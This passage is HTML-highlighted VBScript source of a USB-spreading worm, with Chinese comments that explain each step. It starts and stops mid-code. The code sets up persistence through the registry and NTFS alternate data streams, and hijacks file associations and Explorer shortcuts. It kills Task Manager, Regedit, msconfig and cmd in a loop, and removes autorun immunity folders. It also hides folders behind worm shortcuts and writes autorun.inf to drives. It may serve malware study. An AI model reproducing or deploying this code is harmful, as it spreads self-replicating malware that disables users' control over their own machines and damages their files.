class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"emc"</span> <span class="comment">'//劫持Win+E</span></span><br><span class="line">        RunPath=<span class="string">"explorer.exe /n,/e,::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;"</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">        <span class="keyword">If</span> PreDblInstance=<span class="literal">True</span> <span class="keyword">Then</span> <span class="comment">'//如果条件满足，退出脚本宿主</span></span><br><span class="line">            WScript.Quit</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">        Timeout = <span class="built_in">Datediff</span>(<span class="string">"ww"</span>, GetInfectedDate, <span class="built_in">Date</span>) - <span class="number">12</span></span><br><span class="line">        <span class="keyword">If</span> Timeout&gt;<span class="number">0</span> <span class="keyword">And</span> <span class="built_in">Month</span>(<span class="built_in">Date</span>) = <span class="built_in">Day</span>(<span class="built_in">Date</span>) <span class="keyword">Then</span></span><br><span class="line">               <span class="keyword">Call</span> VirusAlert()</span><br><span class="line">               <span class="keyword">Call</span> MakeJoke(<span class="built_in">CInt</span>(<span class="built_in">Month</span>(<span class="built_in">Date</span>)))</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">        <span class="keyword">Call</span> MonitorSystem()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//监视系统 结束taskmgr.exe、regedit.exe、msconfig.exe、cmd.exe</span></span><br><span class="line"><span class="keyword">Sub</span> MonitorSystem()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> ProcessNames, ExeFullNames</span><br><span class="line">    ProcessNames=<span class="built_in">Array</span>(<span class="string">"cmd.exe"</span>,<span class="string">"cmd.com"</span>,<span class="string">"regedit.exe"</span>,<span class="string">"regedit.scr"</span>,<span class="string">"regedit.pif"</span>,<span class="string">"regedit.com"</span>,<span class="string">"msconfig.exe"</span>)</span><br><span class="line">    VBSFullNames=<span class="built_in">Array</span>(GetMainVirus(<span class="number">1</span>)) <span class="comment">'//变量赋值</span></span><br><span class="line">    <span class="keyword">Do</span></span><br><span class="line">        <span class="keyword">Call</span> KillProcess(ProcessNames) <span class="comment">'//如发现变量中的进程，调用结束进程函数</span></span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(GetMainVirus(<span class="number">1</span>),GetMainVirus(<span class="number">0</span>)) <span class="comment">'// smss.exe 蠕虫地址 explorer.exe 蠕虫地址</span></span><br><span class="line">        <span class="keyword">Call</span> KeepProcess(VBSFullNames) <span class="comment">'//保持病毒进程</span></span><br><span class="line">        WScript.Sleep <span class="number">3000</span> <span class="comment">'//脚本宿主等待时间为3000毫秒=3秒</span></span><br><span class="line">    <span class="keyword">Loop</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//侵入系统</span></span><br><span class="line"><span class="keyword">Sub</span> InvadeSystem(VirusLoadPath,VirusAssPath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version</span><br><span class="line">    Load_Value=<span class="string">""""</span>&amp;VirusLoadPath&amp;<span class="string">""""</span> <span class="comment">'//smss.exe的病毒流</span></span><br><span class="line">    File_Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;VirusAssPath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span> <span class="comment">'// explorer.exe 蠕虫</span></span><br><span class="line">    IE_Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;VirusAssPath&amp;<span class="string">""""</span>&amp;<span class="string">" OIE "</span> <span class="comment">'// 打开ie 蠕虫</span></span><br><span class="line">    MyCpt_Value1=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;VirusAssPath&amp;<span class="string">""""</span>&amp;<span class="string">" OMC "</span> <span class="comment">'//打开我的电脑 蠕虫</span></span><br><span class="line">    MyCpt_Value2=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;VirusAssPath&amp;<span class="string">""""</span>&amp;<span class="string">" EMC "</span> <span class="comment">'//劫持Win+E 蠕虫</span></span><br><span class="line">    HCULoad=<span class="string">"HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Load"</span></span><br><span class="line">    HCUVer=<span class="string">"HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"</span></span><br><span class="line">    HCUDate=<span class="string">"HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"</span></span><br><span class="line">    VirusCode=GetCode(WScript.ScriptFullName)</span><br><span class="line">    Version=<span class="number">1</span></span><br><span class="line">    HostSourcePath=Fso.GetSpecialFolder(<span class="number">1</span>)&amp;<span class="string">"/Wscript.exe"</span></span><br><span class="line">    HostFilePath=Fso.GetSpecialFolder(<span class="number">0</span>)&amp;<span class="string">"/system/svchost.exe"</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> Drive <span class="keyword">In</span> Fso.Drives <span class="comment">'//分别建立各个目录的病毒名字</span></span><br><span class="line">        <span class="keyword">If</span> Drive.IsReady <span class="keyword">and</span> (Drive.DriveType=<span class="number">1</span> <span class="keyword">Or</span> Drive.DriveType=<span class="number">2</span> <span class="keyword">Or</span> Drive.DriveType=<span class="number">3</span>) <span class="keyword">Then</span></span><br><span class="line">            DiskVirusName=GetSerialNumber(Drive.DriveLetter)&amp;<span class="string">".vbs"</span></span><br><span class="line">                <span class="keyword">Call</span> CreateAutoRun(Drive.DriveLetter,DiskVirusName) <span class="comment">'//创建自动运行</span></span><br><span class="line">                <span class="keyword">Call</span> InfectRoot(Drive.DriveLetter,DiskVirusName) <span class="comment">'//感染</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(VirusAssPath)=<span class="literal">False</span> <span class="keyword">Or</span> FSO.FileExists(VirusLoadPath)=<span class="literal">False</span> <span class="keyword">Or</span> FSO.FileExists(HostFilePath)=<span class="literal">False</span> <span class="keyword">Or</span> GetVersion()&lt; Version <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">If</span> GetFileSystemType(GetSystemDrive())=<span class="string">"NTFS"</span> <span class="keyword">Then</span> <span class="comment">'//判断是否为NTFS分区</span></span><br><span class="line">            <span class="keyword">Call</span> CreateFile(VirusCode,VirusAssPath)</span><br><span class="line">            <span class="keyword">Call</span> CreateFile(VirusCode,VirusLoadPath) <span class="comment">'//这一步创建了流文件</span></span><br><span class="line">            <span class="keyword">Call</span> CopyFile(HostSourcePath,HostFilePath) <span class="comment">'//这一步将wscript.exe从system32复制到system目录并改名svchost.exe</span></span><br><span class="line">            <span class="keyword">Call</span> SetHiddenAttr(HostFilePath)</span><br><span class="line">        <span class="keyword">Else</span> <span class="comment">'//FAT32格式</span></span><br><span class="line">            <span class="keyword">Call</span> CreateFile(VirusCode, VirusAssPath)</span><br><span class="line">            <span class="keyword">Call</span> SetHiddenAttr(VirusAssPath)</span><br><span class="line">            <span class="keyword">Call</span> CreateFile(VirusCode,VirusLoadPath)</span><br><span class="line">            <span class="keyword">Call</span> SetHiddenAttr(VirusLoadPath)</span><br><span class="line">            <span class="keyword">Call</span> CopyFile(HostSourcePath, HostFilePath)</span><br><span class="line">            <span class="keyword">Call</span> SetHiddenAttr(HostFilePath)</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(HCULoad)&lt;&gt;Load_Value  <span class="keyword">Then</span>  <span class="comment">'//改写注册表启动项，smss.exe的流</span></span><br><span class="line">        <span class="keyword">Call</span> WriteReg (HCULoad, Load_Value, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> GetVersion() &lt; Version <span class="keyword">Then</span>   <span class="comment">'//改写版本信息为1</span></span><br><span class="line">        <span class="keyword">Call</span> WriteReg (HCUVer, Version, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> GetInfectedDate() = <span class="string">""</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> WriteReg (HCUDate, <span class="built_in">Date</span>, <span class="string">""</span>)  <span class="comment">'//记录感染时间</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">'//以下更改许多文件关联,病毒的通用感染方式</span></span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetTxtFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetIniFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetInfFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetBatFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetCmdFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetRegFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetchmFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SethlpFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/"</span>)&lt;&gt;IE_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetIEAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;871C5380-42A0-1069-A2EA-08002B30309D&#125;/shell/OpenHomePage/Command/"</span>)&lt;&gt;IE_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetIEAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;/shell/open/command/"</span>)&lt;&gt;MyCpt_Value1 <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetMyComputerAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;/shell/explore/command/"</span>)&lt;&gt;MyCpt_Value2 <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetMyComputerAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Call</span> RegSet()</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//拷贝文件</span></span><br><span class="line"><span class="keyword">Sub</span> CopyFile(source, pathf)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(pathf) <span class="keyword">Then</span></span><br><span class="line">        FSO.DeleteFile pathf , <span class="literal">True</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span>    </span><br><span class="line">    FSO.CopyFile source, pathf</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//创建文件</span></span><br><span class="line"><span class="keyword">Sub</span> CreateFile(code, pathf)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> FileText</span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(pathf) <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Set</span> FileText=FSO.OpenTextFile(pathf, <span class="number">2</span>, <span class="literal">False</span>)</span><br><span class="line">        FileText.Write code</span><br><span class="line">        FileText.Close</span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        <span class="keyword">Set</span> FileText=FSO.OpenTextFile(pathf, <span class="number">2</span>, <span class="literal">True</span>)</span><br><span class="line">        FileText.Write code</span><br><span class="line">        FileText.Close</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//注册表设置</span></span><br><span class="line"><span class="keyword">Sub</span> RegSet()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </span><br><span class="line">    <span class="keyword">Dim</span> RegPath1 , RegPath2, RegPath3, RegPath4</span><br><span class="line">    RegPath1=<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/NOHIDDEN/CheckedValue"</span></span><br><span class="line">    RegPath2=<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/SHOWALL/CheckedValue"</span></span><br><span class="line">    RegPath3=<span class="string">"HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoDriveTypeAutoRun"</span></span><br><span class="line">    RegPath4=<span class="string">"HKEY_CLASSES_ROOT/lnkfile/IsShortcut"</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg (RegPath1, <span class="number">3</span>, <span class="string">"REG_DWORD"</span>)</span><br><span class="line">    <span class="keyword">Call</span> WriteReg (RegPath2, <span class="number">2</span>, <span class="string">"REG_DWORD"</span>)</span><br><span class="line">    <span class="keyword">Call</span> WriteReg (RegPath3, <span class="number">0</span>, <span class="string">"REG_DWORD"</span>)</span><br><span class="line">    <span class="keyword">Call</span> DeleteReg (RegPath4)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//结束进程</span></span><br><span class="line"><span class="keyword">Sub</span> KillProcess(ProcessNames)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Set</span> WMIService=<span class="built_in">GetObject</span>(<span class="string">"winmgmts://./root/cimv2"</span>)</span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> ProcessName <span class="keyword">in</span> ProcessNames </span><br><span class="line">        <span class="keyword">Set</span> ProcessList=WMIService.execquery(<span class="string">" Select * From win32_process where name ='"</span>&amp;ProcessName&amp;<span class="string">"' "</span>)</span><br><span class="line">        <span class="keyword">For</span> <span class="keyword">Each</span> Process <span class="keyword">in</span> ProcessList</span><br><span class="line">            IntReturn=Process.terminate</span><br><span class="line">            <span class="keyword">If</span> intReturn&lt;&gt;<span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">                WshShell.Run <span class="string">"CMD /c ntsd -c q -p "</span>&amp;Process.Handle, vbHide, <span class="literal">False</span></span><br><span class="line">            <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//删掉autorun.inf免疫目录</span></span><br><span class="line"><span class="keyword">Sub</span> KillImmunity(D)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    ImmunityFolder=D&amp;<span class="string">":/Autorun.inf"</span></span><br><span class="line">    <span class="keyword">If</span> Fso.FolderExists(ImmunityFolder) <span class="keyword">Then</span></span><br><span class="line">        WshSHell.Run (<span class="string">"CMD /C CACLS "</span>&amp; <span class="string">""""</span>&amp;ImmunityFolder&amp;<span class="string">""""</span> &amp;<span class="string">" /t /e /c /g everyone:f"</span>),vbHide,<span class="literal">True</span>   <span class="comment">'//提权</span></span><br><span class="line">        WshSHell.Run (<span class="string">"CMD /C RD /S /Q "</span>&amp; ImmunityFolder), vbHide, <span class="literal">True</span>   <span class="comment">'//rd命令删除，配合 /s /q 选项，很轻松</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//保护病毒进程 保持脚本进程持续运行，少于2个创建新进程</span></span><br><span class="line"><span class="keyword">Sub</span> KeepProcess(VBSFullNames)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> VBSFullName <span class="keyword">in</span> VBSFullNames </span><br><span class="line">        <span class="keyword">If</span> VBSProcessCount(VBSFullName) &lt; <span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">            Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VBSFullName)</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获得系统分区 c:</span></span><br><span class="line"><span class="comment">'//FileSystemObject.GetSpecialFolder 返回指定特殊文件夹</span></span><br><span class="line"><span class="comment">'//WindowsFolder   0   Windows 文件夹，包含 Windows 操作系统安装的文件。 </span></span><br><span class="line"><span class="comment">'//SystemFolder    1   System 文件夹，包含库、字体和设备驱动程序文件。 </span></span><br><span class="line"><span class="comment">'//TemporaryFolder 2   Temp 文件夹，用于保存临时文件。可以在 TMP 环境变量中找到该文件夹的路径。 </span></span><br><span class="line"><span class="comment">'//Left 返回指定数目的从字符串的左边算起的字符。</span></span><br><span class="line"><span class="keyword">Function</span> GetSystemDrive()</span><br><span class="line">    GetSystemDrive=<span class="built_in">Left</span>(Fso.GetSpecialFolder(<span class="number">0</span>),<span class="number">2</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//FileSystemObject.GetDrive返回与指定的路径中驱动器相对应的 Drive 对象。Drive 提供对磁盘驱动器或网络共享的属性的访问。</span></span><br><span class="line"><span class="comment">'//Drive.FileSystem返回指定的驱动器使用的文件系统的类型。</span></span><br><span class="line"><span class="keyword">Function</span> GetFileSystemType(Drive)</span><br><span class="line">    <span class="keyword">Set</span> d=FSO.GetDrive(Drive)</span><br><span class="line">    GetFileSystemType=d.FileSystem</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//读取注册表建值 返回所在路径</span></span><br><span class="line"><span class="keyword">Function</span> ReadReg(strkey)</span><br><span class="line">    <span class="keyword">Dim</span> tmps</span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">    ReadReg=tmps.RegRead(strkey)</span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//重写注册表键值</span></span><br><span class="line"><span class="keyword">Sub</span> WriteReg(strkey, Value, vtype)</span><br><span class="line">    <span class="keyword">Dim</span> tmps</span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">    <span class="keyword">If</span> vtype=<span class="string">""</span> <span class="keyword">Then</span></span><br><span class="line">        tmps.RegWrite strkey, Value</span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        tmps.RegWrite strkey, Value, vtype</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//删除注册表键值</span></span><br><span class="line"><span class="keyword">Sub</span> DeleteReg(strkey)</span><br><span class="line">    <span class="keyword">Dim</span> tmps</span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">    tmps.RegDelete strkey</span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//设置隐藏属性</span></span><br><span class="line"><span class="keyword">Sub</span> SetHiddenAttr(path)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> vf</span><br><span class="line">    <span class="keyword">Set</span> vf=FSO.GetFile(path)</span><br><span class="line">    <span class="keyword">Set</span> vf=FSO.GetFolder(path)</span><br><span class="line">    vf.Attributes=<span class="number">6</span> <span class="comment">'// 6=2+4 分别是隐藏、系统属性</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//执行ExeFullName指定的文件</span></span><br><span class="line"><span class="keyword">Sub</span> Run(ExeFullName)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> WshShell</span><br><span class="line">    <span class="keyword">Set</span> WshShell=WScript.<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">    WshShell.Run ExeFullName</span><br><span class="line">    <span class="keyword">Set</span> WshShell=<span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//感染根目录</span></span><br><span class="line"><span class="keyword">Sub</span> InfectRoot(D,VirusName)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> VBSCode</span><br><span class="line">    VBSCode=GetCode(WScript.ScriptFullName)</span><br><span class="line">    VBSPath=D&amp;<span class="string">":/"</span>&amp;VirusName</span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(VBSPath)=<span class="literal">False</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> CreateFile(VBSCode, VBSPath)</span><br><span class="line">        <span class="keyword">Call</span> SetHiddenAttr(VBSPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Set</span> Folder=Fso.GetFolder(D&amp;<span class="string">":/"</span>)  <span class="comment">'//隐藏根目录下的所有子目录</span></span><br><span class="line">    <span class="keyword">Set</span> SubFolders=Folder.Subfolders</span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> SubFolder <span class="keyword">In</span> SubFolders</span><br><span class="line">        SetHiddenAttr(SubFolder.Path)</span><br><span class="line">        LnkPath=D&amp;<span class="string">":/"</span>&amp;SubFolder.Name&amp;<span class="string">".lnk"</span>  <span class="comment">'//创建对应的快捷方式</span></span><br><span class="line">        TargetPath=D&amp;<span class="string">":/"</span>&amp;VirusName</span><br><span class="line">        Args=<span class="string">""""</span>&amp;D&amp;<span class="string">":/"</span>&amp;SubFolder.Name&amp; <span class="string">"/Dir"""</span></span><br><span class="line">        <span class="keyword">If</span> Fso.FileExists(LnkPath)=<span class="literal">False</span> <span class="keyword">Or</span> GetTargetPath(LnkPath) &lt;&gt; TargetPath <span class="keyword">Then</span></span><br><span class="line">            <span class="keyword">If</span> Fso.FileExists(LnkPath)=<span class="literal">True</span> <span class="keyword">Then</span></span><br><span class="line">                FSO.DeleteFile LnkPath, <span class="literal">True</span></span><br><span class="line">            <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">            <span class="keyword">Call</span> CreateShortcut(LnkPath,TargetPath,Args)</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//上一步失败了调用这个函数创建快捷方式</span></span><br><span class="line"><span class="keyword">Sub</span> CreateShortcut(LnkPath,TargetPath,Args)</span><br><span class="line">    <span class="keyword">Set</span> Shortcut=WshShell.CreateShortcut(LnkPath)</span><br><span class="line">    <span class="keyword">with</span> Shortcut</span><br><span class="line">        .TargetPath=TargetPath</span><br><span class="line">        .Arguments=Args</span><br><span class="line">        .WindowStyle=<span class="number">4</span></span><br><span class="line">        .IconLocation=<span class="string">"%SystemRoot%/System32/Shell32.dll, 3"</span></span><br><span class="line">        .Save</span><br><span class="line">    <span class="keyword">end</span> <span class="keyword">with</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//创建autorun.inf文件</span></span><br><span class="line"><span class="keyword">Sub</span> CreateAutoRun(D,VirusName)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> InfPath, VBSPath, VBSCode</span><br><span class="line">    InfPath=D&amp;<span class="string">":/AutoRun.inf"</span></span><br><span class="line">    VBSPath=D&amp;<span class="string">":/"</span>&amp;VirusName</span><br><span class="line">    